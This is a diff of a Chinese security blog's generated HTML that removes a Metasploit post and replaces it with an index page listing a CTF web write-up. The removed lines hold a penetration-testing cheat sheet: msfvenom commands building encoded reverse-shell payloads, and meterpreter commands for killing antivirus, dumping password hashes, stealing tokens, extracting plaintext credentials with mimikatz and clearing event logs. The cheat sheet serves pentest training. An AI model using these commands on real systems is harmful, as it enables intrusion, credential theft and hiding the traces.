@@ -14,21 +14,20 @@
 <meta name="author" content="obsem">
 
 
+    
+    
 
-<meta name="description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit">
-<meta property="og:url" content="http://yoursite.com/2020/07/26/内网渗透之Metasploit/index.html">
+
+<meta name="description" content="时间不在你拥有多少，而在于你怎么使用。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="obsetear">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="obsetear">
-<meta property="og:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
+<meta property="og:description" content="时间不在你拥有多少，而在于你怎么使用。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/internet/msf1.jpg">
-<meta property="og:image" content="http://yoursite.com/internet/msf2.jpg">
-<meta property="og:updated_time" content="2020-07-27T11:27:19.039Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metasploit">
-<meta name="twitter:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
-<meta name="twitter:image" content="http://yoursite.com/internet/msf1.jpg">
+<meta name="twitter:title" content="obsetear">
+<meta name="twitter:description" content="时间不在你拥有多少，而在于你怎么使用。">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -56,11 +55,13 @@
 <link rel="stylesheet" href="/css/style.css">
 
 
+    <style> .article { opacity: 0;} </style>
+
 
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Metasploit | obsetear</title>
+<title>obsetear</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -69,8 +70,8 @@
     var yiliaConfig = {
         fancybox: true,
         animate: true,
-        isHome: false,
-        isPost: true,
+        isHome: true,
+        isPost: false,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -260,11 +261,13 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-内网渗透之Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap">
+  
+    <article id="post-攻防世界web系列" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/07/26/内网渗透之Metasploit/" class="article-date">
-      <time datetime="2020-07-25T16:00:00.000Z" itemprop="datePublished">2020-07-26</time>
+      <a href="/2019/09/23/攻防世界web系列/" class="article-date">
+      <time datetime="2019-09-22T16:00:00.000Z" itemprop="datePublished">2019-09-23</time>
 </a>
 
 
@@ -278,270 +281,39 @@
       <header class="article-header">
         
   
-    <h1 class="article-title" itemprop="name">
-      Metasploit
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a>
     </h1>
   
 
       </header>
       
-      <div class="article-info article-info-post">
-        
-
-        
-        <div class="clearfix"></div>
-      </div>
-      
     
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="1、文件目录"><a href="#1、文件目录" class="headerlink" title="1、文件目录"></a>1、文件目录</h2><pre><code>目录所在位置：/usr/share/metasploit-framework/</code></pre><a id="more"></a>    
-<pre><code>data目录：里面存放一些可编辑的文件
-
-documentation目录：文档目录，里面存放一些相关文档
-
-lib目录：静态连接库目录
-
-modules目录：模块目录</code></pre><h2 id="2、基础使用"><a href="#2、基础使用" class="headerlink" title="2、基础使用"></a>2、基础使用</h2><pre><code>msfdb init：初始化并启动msf数据库
-
-msfconsole：开启msf
-
-db_status：查看数据库状态
-
-help：查看帮助
-
-exit：退出msf
-
-show：进行罗列模块
-
-search：搜索模块
-
-back：返回上一级
-
-info：查看模块信息
-
-show options：查看配置
-
-set：设置一个值
-
-exploit：执行模块
-
-jobs：查看工作
-
-kill：杀死工作
-
-使用kage实现界面化：
-
-    1）启动msf：msfconsole -q -x &apos;load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=obse Pass=123456&apos;</code></pre><img src="/internet/msf1.jpg">
-
-<pre><code>2）启动kage</code></pre><img src="/internet/msf2.jpg">
-
-<h2 id="3、信息收集"><a href="#3、信息收集" class="headerlink" title="3、信息收集"></a>3、信息收集</h2><pre><code>arp扫描模块 ———— auxiliary/scanner/discovery/arp_sweep
-
-udp扫描模块 ———— auxiliary/scanner/discovery/udp _sweep
-
-端口扫描模块 ———— auxiliary/scanner/portscan/tcp</code></pre><h2 id="4、msfvenom"><a href="#4、msfvenom" class="headerlink" title="4、msfvenom"></a>4、msfvenom</h2><pre><code>**常用参数**
-
-    -l：查看列表
-
-    -p：指定payload
-
-    -f：指定输出格式
-
-    -e: 指定编码方式
-
-    -i：指定编码次数
-
-demo
-
-    windows ———— msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -e x86/shikata_ ga_nai -i 5 -f exe &gt; 1.exe
-
-    linux ———— msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -f elf &gt; 1.elf</code></pre><h2 id="5、meterpreter"><a href="#5、meterpreter" class="headerlink" title="5、meterpreter"></a>5、meterpreter</h2><pre><code>**基本操作**
-
-    background:返回
-
-    sessions -l：查看所有会话信息
-
-    sessions -i：与指定的会话进行交互
-
-    pwd：查看目标当前目录
-
-    lpwd：查看本地当前目录
-
-    cd：切换至目标指定目录
-
-    lcd：切换至本机的指定目录
-
-    ls：列出目标的文件
-
-    clearev：清理痕迹
-
-    download：将目标文件下载到本地
-
-    upload：将文件上传到目标
-
-    execute：在目标执行命令的功能
-
-         execute -f 1.exe -H(隐藏执行一个程序)
-
-    ps：列出目标进程
-
-    getuid：查看当前用户的身份
-
-    getprivs: 查看用户的权限
-
-    migrate：进程迁移命令
-
-    getpid：查看木马进程
-
-    shell：进入终端环境 
-
-        chcp 65001:更改编码，防止乱码
-
-    exit：退出终端环境
-
-    idletime:查看目标服务器空闲时间
-
-    sysinfo: 查看目标信息
-
-    kill:杀死目标主机的一个进程
-
-    shutdown:关机
-
-    reboot:重启
-
-    netstat：查看目标ip信息
-
-    getsystem:尝试提权（低版本的系统才能成功）
-
-**meterpreter下run命令的一些用法**
-
-    run killav:杀死杀毒软件
-
-    run hashdump:导出目标机的密码
-
-    run post/windows/wlan/wlan_ profile: 查看wifi密码
-
-    run vnc:实时屏幕监控
-
-    run webcam:开启一个摄像头
-
-    run post/windows/gather/checkvm:查看当前主机是否为虚拟机
-
-    run post/windows/manage/enable_rdp: 开启目标的3389
-
-**token窃取**
-
-    load incognito：加载incognito
-
-    list_tokens -u：列举token
-
-    impersonate_token：窃取一个指定token
-
-    steal_token 3306：从进程中窃取token
-
-**mimikatz模块获取密码**
-
-    load mimikatz：加载mimikatz模块
-
-    msv：获取登录密码的hash值
-
-    kerberos/wdigest/tspkg：抓取明文密码
-
-**更新**
-
-    apt update
-
-    apt install metasploit-framework</code></pre>
+              <h2 id="0x01、NaNNaNNaNNaN-Batman"><a href="#0x01、NaNNaNNaNNaN-Batman" class="headerlink" title="0x01、NaNNaNNaNNaN-Batman"></a>0x01、NaNNaNNaNNaN-Batman</h2><p>题目是一个文件web100，没有后缀，加上.php后缀后打开发现是乱码的</p>
+          
       
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a href="/2019/09/23/攻防世界web系列/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
     </div>
     
   </div>
   
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
-        <p><span>发布时间:</span>2020-07-26, 00:00:00</p>
-        <p><span>最后更新:</span>2020-07-27, 19:27:19</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/07/26/内网渗透之Metasploit/" title="Metasploit">http://yoursite.com/2020/07/26/内网渗透之Metasploit/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/07/26/内网渗透之Metasploit/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
-
-
-
-    <nav id="article-nav">
-        
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/07/29/内网渗透之CobaltStrike/">
-                    CobaltStrike
-                </a>
-            </div>
-        
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/07/25/内网渗透之windows基础/">
-                    Windows基础
-                </a>
-            </div>
-        
-    </nav>
-
-  
 </article>
 
-    <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
-        
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、文件目录"><span class="toc-number">1.</span> <span class="toc-text">1、文件目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、基础使用"><span class="toc-number">2.</span> <span class="toc-text">2、基础使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、信息收集"><span class="toc-number">3.</span> <span class="toc-text">3、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、msfvenom"><span class="toc-number">4.</span> <span class="toc-text">4、msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、meterpreter"><span class="toc-number">5.</span> <span class="toc-text">5、meterpreter</span></a></li></ol>
-        
-    </div>
-    <style>
-        .left-col .switch-btn,
-        .left-col .switch-area {
-            display: none;
-        }
-        .toc-level-3 i,
-        .toc-level-3 ol {
-            display: none !important;
-        }
-    </style>
-
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-    <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
-    </script>
-
-
-
-    
-<div class="share">
-    
-        <div class="bdsharebuttonbox">
-            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
-            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
-            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
-            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
-            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
-            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
-        </div>
-        <script>
-            window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Metasploit　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
-        </script>
-    
-
-    
-</div>
 
 
 
@@ -549,35 +321,13 @@ demo
 
 
 
-    
 
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2020/07/29/内网渗透之CobaltStrike/" title="上一篇: CobaltStrike">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-
-        
-            <a href="/2020/07/25/内网渗透之windows基础/" title="下一篇: Windows基础">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">文件包含漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li></ul>
-
-
-
-
-    <script>
-        
-    </script>
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    </nav>
+  
 </div>
       <footer id="footer">
     <div class="outer">
